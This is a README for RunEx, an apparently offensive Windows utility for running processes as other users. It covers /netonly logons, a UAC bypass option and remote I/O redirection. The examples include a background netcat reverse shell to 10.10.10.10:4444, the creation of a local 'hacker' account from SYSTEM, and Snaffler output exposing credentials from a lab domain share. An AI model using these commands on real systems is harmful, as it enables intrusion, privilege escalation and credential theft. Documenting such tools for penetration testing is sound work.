# RunEx v2.0

Run processes as another user. Works from interactive and service contexts, handles window station DACLs, redirects I/O. Supports `/netonly` logon for running AD tooling from non-domain-joined machines.

## Features

- `/netonly` logon — execute tools against Active Directory from a non-domain-joined host using explicit credentials.
- Passthrough mode (`-P`) — real-time interactive I/O with the child process. Streams output as it happens and propagates exit codes.
- Works from SYSTEM — service contexts, PsExec sessions, scheduled tasks. Handles window station DACLs automatically.
- UAC bypass — spawn a full-privilege process without the filtered admin token.
- Remote I/O — redirect stdin/stdout to a remote host for out-of-band command execution.
- PowerShell wrapper — `Invoke-RunEx user pass { whoami }`. Supports scriptblocks and bare arguments.
- No install — single .exe, targets .NET 4.0 (built into Windows 10/11/Server 2016+).

## Usage

```
RunEx.exe username password cmd [args...] [options]
RunEx.exe username password [options] -- cmd [args...]
```

### Options

```
-d, --domain <domain>       domain (default: local)
-l, --logon-type <type>     logon type (default: interactive)
-f, --function <id>         CreateProcess function (default: auto-detect)
-t, --timeout <ms>          process wait time (default: 120000, 0 = background)
-r, --remote <host:port>    redirect I/O to remote host
-p, --force-profile         create user profile if absent
-b, --bypass-uac            UAC bypass (requires -f withlogon)
-i, --impersonate           assign user token to main thread
-P, --passthrough           real-time I/O, propagate exit code (exe only)
-v, --verbose               show execution details
```

### Logon types (`-l`)

| Alias | Value | Use case |
|-------|-------|----------|
| `interactive` | 2 | Default. Standard logon like `runas.exe`. UAC-filtered. |
| `cleartext` | 8 | Full admin token, not UAC-filtered. Creds available for network auth. |
| `netonly` / `newcreds` | 9 | `/netonly` — creds only for outbound network (SMB, LDAP, Kerberos). `whoami` shows you. |

Other types (network, batch, service, etc.) are supported — run `--help-all` for the full list.

### CreateProcess functions (`-f`)

| Alias | Value | Required privilege |
|-------|-------|--------------------|
| `asuser` | 0 | `SeAssignPrimaryTokenPrivilege` (SYSTEM) |
| `withtoken` | 1 | `SeImpersonatePrivilege` (admin/SYSTEM) |
| `withlogon` | 2 | None — works as any user |

Auto-detected based on your current token when `-f` is not specified.

## Examples

```bash
# Run a command as a local user
RunEx.exe user1 password1 cmd /c whoami /all

# Interactive session under different creds
RunEx.exe user1 password1 -P -- cmd.exe

# Domain user with cleartext logon (full admin token)
RunEx.exe user1 password1 cmd /c whoami /all -d domain -l cleartext

# /netonly — access AD resources from a non-domain-joined box
RunEx.exe user1 password1 -l netonly -f withlogon -d DOMAIN -- net view \\dc.domain.local

# Background reverse shell
RunEx.exe user1 password1 -t 0 -- C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe

# Redirect I/O to remote listener
RunEx.exe user1 password1 cmd.exe -r 10.10.10.10:4444

# UAC bypass
RunEx.exe adm1 password1 cmd /c whoami /priv --bypass-uac

# Verbose — see every step
RunEx.exe user1 password1 -v cmd /c whoami
```

### /netonly in action

```
# no creds — access denied
PS Z:\tools> net view \\winterfell.north.sevenkingdoms.local
System error 5 has occurred.

Access is denied.

# with RunEx — works
PS Z:\tools> .\RunEx.exe brandon.stark iseedeadpeople -l netonly -f withlogon -d north.sevenkingdoms.local -- net view \\winterfell.north.sevenkingdoms.local

Shared resources at \\winterfell.north.sevenkingdoms.local

Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The command completed successfully.
```

### Running as another local user from SYSTEM

```
# create a local user
PS Z:\tools> net user hacker H@cker123 /add
The command completed successfully.

# currently running as SYSTEM
PS Z:\tools> whoami
nt authority\system

# run whoami as the new user
PS Z:\tools> .\RunEx.exe hacker H@cker123 -- whoami
[*] Warning: User profile directory for user hacker does not exist. Use --force-profile if you want to force the creation.

winbox\hacker
```

### Passthrough + Snaffler over /netonly

```
# run Snaffler as a domain user with real-time output (-P)
PS Z:\tools> .\RunEx.exe brandon.stark iseedeadpeople -P -l newcreds -f withlogon -d north.sevenkingdoms.local -- .\Snaffler.exe -d north.sevenkingdoms.local -s -o snaffler.log
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:50Z [Info] Parsing args...
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:50Z [Info] Parsed args successfully.
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:50Z [Info] Invoking DFS Discovery because no ComputerTargets or PathTargets were specified
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:50Z [Info] Getting DFS paths from AD.
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:51Z [Info] Found 0 DFS Shares in 0 namespaces.
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:51Z [Info] Invoking full domain computer discovery.
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:51Z [Info] Getting computers from AD.
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:51Z [Info] Got 2 computers from AD.
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:51Z [Info] Starting to look for readable shares...
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:51Z [Info] Created all sharefinder tasks.
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:51Z [Share] {Green}<\\castelblack.north.sevenkingdoms.local\all>(R) Basic RW share for all
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:52Z [Share] {Green}<\\winterfell.north.sevenkingdoms.local\NETLOGON>(R) Logon server share
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:52Z [Share] {Green}<\\castelblack.north.sevenkingdoms.local\public>(R) Basic Read share for all domain users
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:52Z [Share] {Green}<\\winterfell.north.sevenkingdoms.local\SYSVOL>(R) Logon server share
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:52Z [File] {Green}<KeepNameContainsGreen|R|secret|869B|2025-07-22 20:01:15Z>(\\winterfell.north.sevenkingdoms.local\NETLOGON\secret.ps1) secret.ps1
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:52Z [File] {Red}<KeepCmdCredentials|R|passwo?r?d\s*=\s*[\'\"][^\'\"]....|165B|2025-07-22 20:01:12Z>(\\winterfell.north.sevenkingdoms.local\NETLOGON\script.ps1) # fake script in netlogon with creds\n$task = '/c TODO'\n$taskName = "fake task"\n$user = "NORTH\jeor.mormont"\n$password = "_L0ngCl@w_"\n\n# passwords in sysvol still ...
[NT AUTHORITY\SYSTEM@WINBOX] 2026-02-17 19:41:52Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d\s*=\s*[\'\"][^\'\"]....|165B|2025-07-22 20:01:12Z>(\\winterfell.north.sevenkingdoms.local\NETLOGON\script.ps1) # fake script in netlogon with creds\n$task = '/c TODO'\n$taskName = "fake task"\n$user = "NORTH\jeor.mormont"\n$password = "_L0ngCl@w_"\n\n# passwords in sysvol still ...
```

### PowerShell

```powershell
. .\Invoke-RunEx.ps1

# String
Invoke-RunEx user1 password1 "cmd /c whoami /all"

# ScriptBlock
Invoke-RunEx user1 password1 -LogonType netonly -CreateProcessFunction withlogon -Domain DOMAIN { net view \\dc.domain.local }

# Bare arguments
Invoke-RunEx user1 password1 cmd /c whoami /all
```

## Build

Requires `mcs` (Mono) on Linux or `csc.exe` on Windows.

```bash
make              # builds out/RunEx.exe and out/Invoke-RunEx.ps1
make clean        # removes out/
```

Windows:
```
make CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe SDK=
```

## Requirements

.NET Framework 4.0+ (ships with Windows 10/11/Server 2016+). Uses only .NET 2.0 APIs internally for maximum compatibility.

## Credits

Based on [RunasCs](https://github.com/antonioCoco/RunasCs) by [@splinter_code](https://github.com/antonioCoco).

Original credits: [@decoder](https://github.com/decoder-it), [@qtc-de](https://github.com/qtc-de), [@winlogon0](https://twitter.com/winlogon0).
